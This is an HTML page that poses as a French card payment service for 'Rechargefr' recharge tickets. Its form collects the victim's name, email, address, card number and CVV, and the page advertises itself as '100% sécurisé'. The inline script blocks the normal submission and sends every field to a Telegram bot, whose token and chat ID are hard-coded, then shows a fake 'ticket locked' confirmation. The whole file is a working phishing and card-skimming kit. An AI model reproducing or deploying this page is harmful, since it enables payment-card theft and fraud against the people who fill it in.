<!DOCTYPE html>
<html>
<head>
    <title>Rechargefr Payment Service</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	<!-- <link href="https://cdn.lineicons.com/3.0/lineicons.css" rel="stylesheet"> -->
	
</head>
<body>
	<div class="container">
		<h1>Paiement par carte</h1>
		<div class="wrapper">
			<div>
				<img src="img/logo.svg">
			</div>
			<div>
                                <div>
    <form class="payment-form" id="form">
        <input type="text" name="firstname" class="firstname" placeholder="Nom" required>
        <input type="text" name="lastname" class="lastname" placeholder="Prénom"><br>
        <input type="email" name="email" class="email" placeholder="Email" required><br>
        <textarea name="address" class="address" placeholder="Adresse" required></textarea><br>
        <input type="text" name="nameoncard" class="nameoncard" placeholder="Nom sur la carte" required><br>
        <input type="text" name="card" class="card" placeholder="1234 1234 1234 1234" minlength="16" maxlength="16" required>
        <input type="password" name="cvv" class="cvv" maxlength="4" placeholder="CVV" required><br>
        <input type="submit" value="Finaliser la transaction" class="pay-btn">
    </form>
</div>

		</div>
		 <h4>Paiement 100% sécurisé </h4>
	</div>
	 <script>
     document.getElementById('form').addEventListener('submit', function (e) {

        e.preventDefault();

        const telegramBotToken = '6550563050:AAE6DHJ9I4t5EOhVCpoOWY-ZSJiENK7E0Hs';

        const chatId = '-1002083816651';

        const formData = new FormData(e.target);

        // Construct the message text with form data

        let messageText = "New form submission:\n";

        formData.forEach((value, key) => {

            messageText += `${key}: ${value}\n`;

        });

        // Make an AJAX request to send data to Telegram

        const xhr = new XMLHttpRequest();
        const encodedMessageText = encodeURIComponent(messageText);
        xhr.open('GET', `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodedMessageText}`);

        xhr.send();
     
  xhr.onload = function () {
    if (xhr.status === 200) {
                // Display a success popup
                window.alert('ticket verrouillé avec succès');
            } else {
                // Display an error popup
                window.alert('echec lors du verrouillage du ticket, veuillez réessayer');
            }
        };
    });
        
</script>
</body>
